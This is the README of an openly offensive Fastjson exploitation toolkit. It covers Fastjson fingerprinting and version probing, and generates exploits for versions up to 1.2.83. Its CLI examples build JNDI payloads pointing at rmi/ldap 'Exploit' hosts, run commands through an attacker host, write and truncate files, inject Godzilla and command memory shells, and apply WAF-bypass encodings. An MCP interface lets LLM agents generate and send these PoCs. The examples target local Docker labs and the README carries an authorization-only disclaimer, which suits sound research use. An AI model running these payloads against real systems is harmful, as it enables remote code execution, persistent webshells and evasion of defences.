# FastjsonExpToolkit

Fastjson 识别 / 版本探测 / PoC 工具箱。

当前进度：**Phase 3 — 识别 / 版本 / 依赖 + ≤1.2.47 / ≤1.2.68 / 1.2.83 证明 PoC**（Web + API + Docker 靶场）。后续阶段见 [`docs/design.md`](docs/design.md)。

> 仅用于授权测试与本地靶场复现。

## 功能概览

| 能力 | 状态 | 说明 |
|------|------|------|
| Fastjson 识别 | ✅ | 报错 / 解析特征 / `$ref` / DNS·CEYE / 与其他 JSON 库区分 |
| Fastjson 版本探测 | ✅ | AutoType / SafeMode / AutoCloseable 回显 / 不出网二分 / DNSLog |
| 期望类探测 | ✅ | Feature `@type` + 空键语法，判断是否绑定期望类 / 非 Map / &lt;1.2.68 提示 |
| 依赖 / classpath 探测 | ✅ | Character 报错回显（推荐）/ DNS Locale（版本敏感） |
| Web 探测页 | ✅ | `/detect`：识别/版本/期望类按序 + 依赖独立阶段；`/version` `/expect` `/deps` 重定向至此 |
| Web PoC 页 | ✅ | `/poc`，对接 `/api/poc/cve-2026-16723` |
| WAF 绕过 | ✅ | unicode/hex/`\u+`、多逗号、key `_`/`-`、填充、URL 编码；CLI / API / Web `/waf` |
| MCP（Agent） | ✅ | stdio（`fjtoolkit mcp`）+ 设置页启停 HTTP（地址 / Token） |
| Web 设置页 | ✅ | `/settings`，配置 CEYE Token 与 Identifier |
| Docker 靶场 | ✅ | 多解析器对照（Fastjson / Jackson / Gson / Hutool / org.json） |
| CVE-2026-16723（1.2.83）证明 PoC | ✅ | jar:http / fd-cache；CLI / API / Web `/poc`；Undertow 靶场 |
| ≤1.2.68 AutoCloseable 证明 PoC | ✅ | JDK 写/截断、commons-io io1–io5/ioFinal、读文件、MySQL/PG；靶场 `:18268` |
| ≤1.2.80 Exception 缓存证明 PoC | ✅ | jackson→InputStream、commons-io 读写、PG/MySQL、groovy、aspectj、jython；靶场 `:18280` |
| 各版本 PoC / 自定义字节码 | ⏳ | 通用自定义字节码上传 UI 等 |
| 回显 / 内存马 | ✅ | 通用回显 `poc/echo/`；内存马 `poc/memshell/`（内置 memshell-gen.jar，无需常驻 MemShellParty） |

## 快速开始（Web）

### 1. 安装依赖

```bash
# Python 后端（需 Python >= 3.10）
pip install -e ".[dev]"

# 前端
cd web
npm install
cd ..

# （可选）构建内存马生成器 fat jar（约 40MB；首次使用 --memshell 前需要）
# 需本机 Maven + JDK8+，代理见 AGENTS.md
cd vendor/memshell-gen
./build.ps1   # 或 ./build.sh
cd ../..
```

### 2. 一键启停（不含 Docker 靶场）

默认开启**热更新**：

- 后端：`uvicorn --reload`，监听 `src/`（改 Python 代码自动重启）
- 前端：`next dev` HMR（改 `web/` 自动刷新）

关闭后端热更新：`scripts\start.ps1 -NoReload`，或环境变量 `BACKEND_RELOAD=0`。

**Windows**

```bat
scripts\start.bat
scripts\stop.bat
```

也可：`powershell -File scripts\start.ps1` / `scripts\stop.ps1`。

**Linux / macOS**

```bash
chmod +x scripts/start.sh scripts/stop.sh
./scripts/start.sh
./scripts/stop.sh
```

启动后：

| 服务 | 地址 |
|------|------|
| 前端 | http://127.0.0.1:3000 |
| 探测页 | http://127.0.0.1:3000/detect（识别/版本/期望类按序；依赖独立） |
| PoC 页 | http://127.0.0.1:3000/poc |
| WAF 页 | http://127.0.0.1:3000/waf |
| 设置页 | http://127.0.0.1:3000/settings |
| 后端 API | http://127.0.0.1:8000（若被占用/系统保留则自动换端口，以启动脚本输出为准） |
| API 文档（Scalar） | 后端 `/api/docs` 或经前端代理 `/api/docs` |
| Swagger UI | 后端 `/api/swagger` |
| ReDoc | 后端 `/api/redoc` |
| OpenAPI JSON | 后端 `/api/openapi.json` |
| MCP（Streamable HTTP） | 设置页启停，默认 `http://127.0.0.1:8100/mcp`（也可 `fjtoolkit mcp --http`） |

日志目录：`.runtime/logs/`。Windows 上若默认 `8000` 落在 Hyper-V 排除端口段（`WinError 10013`），`start.bat` / `start.ps1` 会自动改用可用端口，并把 `API_ORIGIN` 传给前端。也可手动指定：`$env:BACKEND_PORT=8888`。

手动启动：

```bash
# 默认 --reload；生产可去掉 --reload；端口被保留时改用例如 8888
python -m uvicorn fastjson_toolkit.api.app:app --host 127.0.0.1 --port 8000 --reload
cd web && set API_ORIGIN=http://127.0.0.1:8000&& npm run dev
```

### 3. 配置 CEYE DNSLog

两种方式任选其一：

1. **Web 设置页**：打开 `/settings`，填写 Token 与 Identifier 子域名（如 `hpdth2`），保存后写入项目 `.env`。
2. **手动 `.env`**：复制模板后编辑：

```bash
cp .env.example .env
```

```env
CEYE_TOKEN=your_ceye_api_token
CEYE_DOMAIN=hpdth2.ceye.io
```

验证：在设置页点「测试连接」，或调用 `POST /api/settings/ceye-test`。

### 4. （可选）启动 Docker 靶场

```bash
cd lab
docker compose up --build -d
curl http://127.0.0.1:18080/api/health
```

停止：

```bash
cd lab
docker compose down
```

指纹靶场端口：`18080`

| 端点 | 解析器 |
|------|--------|
| `POST /api/fastjson` | Fastjson 1.2.83（默认安全模式） |
| `POST /api/fastjson/autotype` | Fastjson（开启 autoType，便于 DNS 验证） |
| `POST /api/fastjson/person` | Fastjson 强类型 Person |
| `POST /api/jackson` | Jackson |
| `POST /api/jackson/person` | Jackson 强类型 Person |
| `POST /api/gson` | Gson |
| `POST /api/orgjson` | org.json |
| `POST /api/hutool` | Hutool JSON |

版本矩阵（`lab/fastjson-version-lab`，`docker compose up -d fj-1-2-30 ...`）：

| 端口 | Fastjson |
|------|----------|
| `18030` | 1.2.30 |
| `18047` | 1.2.47 |
| `18068` | 1.2.68 |
| `18082` | 1.2.80 |

每个版本均提供 `POST /api/fastjson` 与 `POST /api/fastjson/autotype`。

### CVE-2026-16723 Undertow 靶场（1.2.83 jar:http）

```bash
cd lab/cve-2026-16723
docker compose up --build -d
curl -X POST http://127.0.0.1:18083/json -H "Content-Type: application/json" -d '{"a":1}'
```

| 项 | 值 |
|----|-----|
| 端口 | `18083` → 容器 `8080` |
| JDWP | `18505` → 容器 `5005` |
| 入口 | `POST /json`（裸 `JSON.parse`） |
| 容器名 | `cve-2026-16723-undertow` |
| extra_hosts | `attacker` / `host.docker.internal` → host-gateway |

**必须 fat jar 启动**；IDE 直接跑会因 ClassLoader 不同导致复现失败。`jar:http` 需 JDK8 + Undertow；`jar:file` / fd-cache 不依赖连续斜杠。

证明 PoC（本机需 `javac` 与 `~/.m2/.../fastjson-1.2.83.jar`）：

```bash
# 出网回显（Docker 靶场用 -H attacker）
fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -e -c id --engine undertow

# fd 缓存不出网
fjtoolkit poc-16723 -u http://127.0.0.1:18083 -m fd -H attacker -e -c id --engine undertow

# 内存马（默认内置 memshell-gen.jar，无需另起 MemShellParty）
fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker --memshell \
  --ms-server Undertow --ms-tool Command --ms-type Filter --ms-jdk 8
```

也可：Web `/poc` 或 `POST /api/poc/cve-2026-16723`。内存马矩阵：`GET /api/memshell/config`。

### Fastjson ≤1.2.47 缓存绕过证明 payload

`java.lang.Class` → MiscCodec → `TypeUtils.loadClass` 写入 mappings，随后 `checkAutoType` 命中缓存绕过黑名单（1.2.48 起默认不缓存）。

```bash
# 列出 gadget
fjtoolkit poc-1247 --list

# 生成 JdbcRowSetImpl JNDI payload
fjtoolkit poc-1247 -g jdbc_rowset --jndi ldap://127.0.0.1:1389/Exploit

# BCEL（tomcat-dbcp2）：传入 .class Base64
fjtoolkit poc-1247 -g bcel_tomcat_dbcp2 --class-b64 "<base64>"

# 可选发送到版本靶场
fjtoolkit poc-1247 -g jdbc_rowset -u http://127.0.0.1:18047/api/fastjson --send

# getter 触发：有期望类时套 Currency（或 currency_json_key）
fjtoolkit poc-1247 -g h2_jdbc --class-b64 "<base64>" -t currency
fjtoolkit poc-1247 -g h2_jdbc --class-b64 "<base64>" -t currency_json_key --json-key-no-type

# BCEL/H2 内存马（与 --echo 互斥）
fjtoolkit poc-1247 -g h2_jdbc --memshell --ms-server Undertow --ms-tool Godzilla
```

覆盖：`jdbc_rowset` / `bcel_tomcat_dbcp` / `bcel_tomcat_dbcp2` / `bcel_commons_dbcp` / `bcel_commons_dbcp2` / `c3p0_wrapper` / `mybatis_bcel` / `h2_jdbc`。  
Getter 触发（与版本无关）：`ref` / `json_key` / `currency` / `currency_json_key`。  
1.2.68/80 默认已内嵌 `$ref`，业务点另有期望类时用 `--wrap-currency`。Web：`/poc` 各版本 Tab。

### Fastjson 1.2.47 gadget 依赖靶场

版本矩阵 `18047` 只有 fastjson；验证 BCEL/C3P0/MyBatis/H2 请用专用靶场（JDK 8u242 + 全依赖）：

```bash
cd lab/fastjson-1247-lab
docker compose up --build -d
# http://127.0.0.1:18247/api/fastjson
# GET/DELETE /api/markers 查看/清理 /tmp/fj1247_* 证明文件

python tests/lab/lab_test_1247_gadgets.py
```

| 项 | 值 |
|----|-----|
| 端口 | `18247` |
| 镜像 | `openjdk:8u242-jdk`（保留 BCEL ClassLoader） |
| 依赖 | tomcat-dbcp 7+9、commons-dbcp(2)、c3p0、mybatis、h2 1.4.200 |

### Fastjson ≤1.2.68 AutoCloseable 证明 payload

双 `@type`：首个 `java.lang.AutoCloseable` 作 expectClass（1.2.69 起进黑名单）。

```bash
# 列出 gadget
fjtoolkit poc-1268 --list

# 生成 FileOutputStream 截断 payload
fjtoolkit poc-1268 -g file_truncate --file /tmp/fj1268_truncate

# commons-io ioFinal 写文件并发送到依赖靶场
fjtoolkit poc-1268 -g io_final --file /tmp/fj1268_iofinal -c 'FJ1268' \
  -u http://127.0.0.1:18268/api/fastjson --send

# 业务点另有期望类时套 Currency 触发 getter（与版本无关）
fjtoolkit poc-1268 -g io1_write --file /tmp/x -c aaaaaa --wrap-currency
```

依赖靶场（JDK11 + commons-io 2.6 + aspectjtools + ant + mysql 5.1 + pg/spring）：

```bash
cd lab/fastjson-1268-lab
docker compose up --build -d
# http://127.0.0.1:18268/api/fastjson
# GET/DELETE /api/markers 查看/清理 /tmp/fj1268_* 

python tests/lab/lab_test_1268_gadgets.py
```

| 项 | 值 |
|----|-----|
| 端口 | `18268` |
| 镜像 | `eclipse-temurin:11-jdk`（MarshalOutputStream + Nashorn URLReader） |
| 依赖 | commons-io 2.6、commons-codec、aspectjtools 1.9.6、ant、mysql-connector 5.1.48、postgresql、spring-context |

Web：`/poc` →「≤1.2.68 AutoCloseable」Tab。API：`GET/POST /api/poc/1.2.68`。

### Fastjson ≤1.2.80 Exception 缓存证明 payload

双 `@type`：首个 `java.lang.Exception` 作 expectClass；经 `ParserConfig.getDeserializer` 缓存字段类型后，再恢复 `InputStream` / `ProcessingUnit` 等（1.2.83 起对 Throwable 子类清空 mapping）。多步链需**共享 ParserConfig**。

```bash
fjtoolkit poc-1280 --list

# Jackson 缓存 InputStream（2 步）
fjtoolkit poc-1280 -g jackson_cache -u http://127.0.0.1:18280/api/fastjson --send --reset-cache

# commons-io + ant 写文件
fjtoolkit poc-1280 -g io_write --file /tmp/fj1280_io_write -c 'FJ1280' \
  -u http://127.0.0.1:18280/api/fastjson --send --reset-cache
```

依赖靶场（JDK11 + jackson-core + commons-io + ant + groovy + aspectj + mysql/pg/spring + jython）：

```bash
cd lab/fastjson-1280-lab
docker compose up --build -d
# http://127.0.0.1:18280/api/fastjson
# POST /api/reset 清空共享 ParserConfig

python tests/lab/lab_test_1280_gadgets.py
```

| 项 | 值 |
|----|-----|
| 端口 | `18280` |
| 镜像 | `eclipse-temurin:11-jdk`（Nashorn URLReader） |
| 依赖 | jackson-core 2.13.5、commons-io 2.6、ant、groovy 2.4.21、aspectjtools、mysql 5.1.48、postgresql、spring-context、jython |

Web：`/poc` →「≤1.2.80 Exception」Tab。API：`GET/POST /api/poc/1.2.80`。

## HTTP API

交互式文档（[Scalar](https://github.com/scalar/scalar) / Swagger / ReDoc）见上表；也可在 Web 顶栏点「API 文档」。

| 方法 | 路径 | 说明 |
|------|------|------|
| `GET` | `/api/health` | 健康检查与 CEYE 配置状态 |
| `GET` | `/api/probes` | 探针列表 |
| `POST` | `/api/detect` | Fastjson 识别 |
| `GET` | `/api/version/probes` | 版本探针列表 |
| `POST` | `/api/version` | Fastjson 版本探测 |
| `GET` | `/api/expect/probes` | 期望类探针列表 |
| `POST` | `/api/expect` | 期望类（expectClass）探测 |
| `GET` | `/api/deps/catalog` | 内置依赖探测类目录 |
| `POST` | `/api/deps` | 依赖 / classpath 探测 |
| `GET` | `/api/poc/1.2.47/gadgets` | ≤1.2.47 gadget 目录 |
| `POST` | `/api/poc/1.2.47` | ≤1.2.47 缓存绕过证明 payload（可选 POST） |
| `GET` | `/api/poc/1.2.68/gadgets` | ≤1.2.68 AutoCloseable gadget 目录 |
| `POST` | `/api/poc/1.2.68` | ≤1.2.68 expectClass 证明 payload（可选 POST） |
| `GET` | `/api/poc/1.2.80/gadgets` | ≤1.2.80 Exception 缓存 gadget 目录 |
| `POST` | `/api/poc/1.2.80` | ≤1.2.80 多步证明 payload（可选按步 POST） |
| `POST` | `/api/poc/cve-2026-16723` | Fastjson 1.2.83 证明 PoC（jar:http / fd-cache） |
| `GET` | `/api/waf/techniques` | WAF 绕过变换列表 |
| `POST` | `/api/waf` | 对 payload 应用 WAF 绕过变换（本地，不发包） |
| `GET` | `/api/settings` | 读取 CEYE 设置（Token 脱敏） |
| `PUT` | `/api/settings` | 保存 CEYE Token / Identifier → `.env` |
| `POST` | `/api/settings/ceye-test` | 测试 CEYE API |

`POST /api/detect` 返回结构化 `DetectResult`：`is_fastjson` / `confidence` / `primary_guess` / `scores` / `evidence` / `dns_confirmed` / `next_actions` 等。

`POST /api/version` 返回 `VersionResult`：`version_range` / `reported_version` / `autotype_enabled` / `safemode_enabled` / `is_1_2_83_hint` / `evidence` / `dns_hits` 等。

`POST /api/deps` 返回 `DepsResult`：`present` / `results` / `method`（`character`|`dns`）/ `notes` 等。推荐 `method=character`（报错回显）；DNS Locale 链版本敏感，本地常无记录。

`POST /api/expect` 返回 `ExpectClassResult`：`has_expect_class` / `expect_not_map` / `version_lt_1_2_68_hint` / `evidence` 等。请传入接近业务的 `base_body`（原始请求 JSON）。

## MCP（Agent 工具）

与 REST 同源引擎，供 Cursor 等 MCP 客户端调用。

| 工具 | 说明 |
|------|------|
| `detect_pipeline` | 识别 → 版本 → 期望类（DNS/CEYE 读 `.env`，无需传 token） |
| `deps_probe` | 依赖探测（默认 `character` 报错回显；`dns` 亦用 `.env` CEYE） |
| `poc_catalog` | gadget / 回显引擎 / WAF 技巧目录 |
| `poc_run` | 生成或发送 PoC |
| `poc_script` | 返回固定原脚本（LLM 自行按环境修改）；不传参则列目录 |
| `docs_list` | 漏洞文档标题与摘要 |
| `docs_get` | 按 slug 取 Markdown 正文 |

**stdio**

```bash
pip install -e .
fjtoolkit mcp
```

Cursor `mcp.json` 示例：

```json
{
  "mcpServers": {
    "fastjson-toolkit": {
      "command": "fjtoolkit",
      "args": ["mcp"]
    }
  }
}
```

**HTTP（推荐在 Web 设置页启停）**

1. 打开 `/settings` →「MCP HTTP」
2. 填写 Host / 端口 / 请求鉴权 Token，点「启动服务」
3. 「复制 Cursor 配置」粘贴到 `mcp.json`

也可命令行：

```bash
fjtoolkit mcp --http --host 127.0.0.1 --port 8100 --token your-secret
```

配置写入 `.env`：`MCP_HTTP_HOST` / `MCP_HTTP_PORT` / `MCP_HTTP_TOKEN`。
客户端通过 `Authorization: Bearer <token>` 或 `X-MCP-Token` 传递 Token。

文档目录默认读取仓库 `web/content/docs/`；也可设环境变量 `FASTJSON_DOCS_DIR`。

## 期望类探测原理（摘要）

1. **Feature `@type`**：在原始参数上注入 `com.alibaba.fastjson.support.geo.Feature`（1.2.68 引入）；报错可能表示存在期望类，也可能是版本 &lt;1.2.68 类不存在  
2. **根级空键** `{ {}: {}, ... }`：若存在期望类且类型不是 Map/其子类，通常报错  
3. **嵌套空键对照** `"test": { { {}: {} }: "" }`：通常不报错，用于排除「语法被一律拒绝」

判定矩阵（基线正常时）：Feature+空键均报错 → 有期望类；仅 Feature 报错 → 倾向 &lt;1.2.68；均不报错 → 无期望类或期望为 Map。

CLI：`fjtoolkit expect http://127.0.0.1:18080/api/fastjson/person`

## WAF 绕过

对已有 Fastjson JSON payload 做本地变换（不发包）：

| 变换 | 说明 |
|------|------|
| `unicode` / `hex` / `unicode_hex` | `\uXXXX` / `\xHH` / 混编 |
| `unicode_plus` | Fastjson `\u+XXX` |
| `multi_comma` | 字段间插入多余逗号 |
| `key_underscore` / `key_hyphen` / `key_mixed` | key 插入 `_`/`-`（解析时剥离；混用需 ≥1.2.36） |
| `pad` | 追加超长无关字段 |
| `url_value` | value 中 `{}` → `%7b`/`%7d` |

```bash
fjtoolkit waf --list
fjtoolkit waf '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}' -t unicode_hex
fjtoolkit waf -f payload.json --mode stack -t key_underscore -t multi_comma

# PoC 生成时直接叠加（可重复 --waf）
fjtoolkit poc-1247 -g jdbc_rowset --waf unicode_hex --waf multi_comma
fjtoolkit poc-1268 -g file_truncate --waf key_underscore
fjtoolkit poc-1280 -g jackson_cache --waf unicode_plus
```

Web：独立页 `/waf`；PoC 页三个生成 Tab 内也可勾选叠加。API：`GET /api/waf/techniques`、`POST /api/waf`；PoC 接口接受 `waf_techniques` / `waf_options`。

## Web 前端

目录：`web/`。技术栈：**Next.js App Router + Tailwind CSS v4 + [shadcn/ui](https://ui.shadcn.com/)（base-nova）**。

约定见 [`AGENTS.md`](AGENTS.md)：所有 UI 只用 shadcn 组件，图标用 `lucide-react`。

若本机访问 `ui.shadcn.com` 超时，在当前 shell 设置代理后再执行 `npx shadcn@latest add ...`：

```powershell
$env:HTTP_PROXY='http://127.0.0.1:10808'
$env:HTTPS_PROXY='http://127.0.0.1:10808'
$env:ALL_PROXY='http://127.0.0.1:10808'
$env:NODE_USE_ENV_PROXY='1'
```

## 识别原理（摘要）

1. **报错特征**：残缺 JSON、`@type` / autoType 相关异常文案  
2. **解析行为**：`new` / hex / 注释 / `Set` / `$ref` 等 Fastjson 特有或强相关语法  
3. **DNS / 时延**：`Inet4Address` 等；可结合 CEYE 轮询确认出网  
4. **差异探针**：与 Jackson / Gson / org.json / Hutool 行为对照，避免误报  

判定策略：依赖强特征命中，差异探针不单独定论。靶场验证结论：Fastjson → `is_fastjson=true`；Jackson / Gson / Hutool / org.json → `false`。

## 依赖探测原理（摘要）

1. **Character 报错（推荐）**：畸形 `@type:java.lang.Character` + `java.lang.Class`；类存在时响应含 `can not cast to char`，不存在常见 `No message available`
2. **DNS Locale（实验）**：`Locale` 加载目标类成功后才构造完整对象并触发 `Inet4Address` DNS；对版本 / autoType 极敏感，本地靶场经常无记录

CLI：`fjtoolkit deps http://127.0.0.1:18080/api/fastjson`

## 版本探测原理（摘要）

1. **AutoType**：`java.lang.Class` vs `Random.String` 报错组合判断是否开启  
2. **SafeMode**：`{"zero":{"@type":"java.lang.String"""}}}` 报错≈开启，不报错≈关闭  
3. **AutoCloseable 回显**：残缺 `{"@type":"java.lang.AutoCloseable"`，提取 `fastjson-version`（注意 1.2.76+ 可能写死）  
4. **1.2.83**：`Test.TestException` 仅在 1.2.83 通常不报错  
5. **不出网二分**：Exception / AutoCloseable / Class+Jdbc / Jdbc 四探针收敛区间  
6. **DNSLog**：<=1.2.47 / <=1.2.68 / 单 DNS≈1.2.80 / 双 DNS≈1.2.83

## 目录结构

```
├── scripts/start.* / stop.*  # 一键启停 Web（默认后端 --reload，不含靶场）
├── docs/design.md            # 设计与阶段规划
├── src/fastjson_toolkit/     # Python 后端（detect / version / deps / expect / poc / api）
├── web/                      # Next.js + shadcn 前端
├── lab/                      # Docker 指纹靶场 + cve-2026-16723 Undertow
├── tests/                    # pytest 单元测试
├── tests/lab/                # 需 Docker 靶场的手动验证 / 压测脚本
├── AGENTS.md                 # Agent 约定
└── .env.example              # CEYE 等配置模板
```

## 开发与测试

```bash
pip install -e ".[dev]"
pytest -q
# 靶场落盘验证（需对应 lab 已 docker compose up）：
# python tests/lab/lab_test_1247_gadgets.py
# python tests/lab/lab_test_1268_gadgets.py
# python tests/lab/lab_test_1280_gadgets.py
```

## 许可与安全

本工具面向安全研究与授权渗透测试。请勿对未授权目标使用。密钥（如 `CEYE_TOKEN`）只放在本地 `.env`，勿提交到 Git。
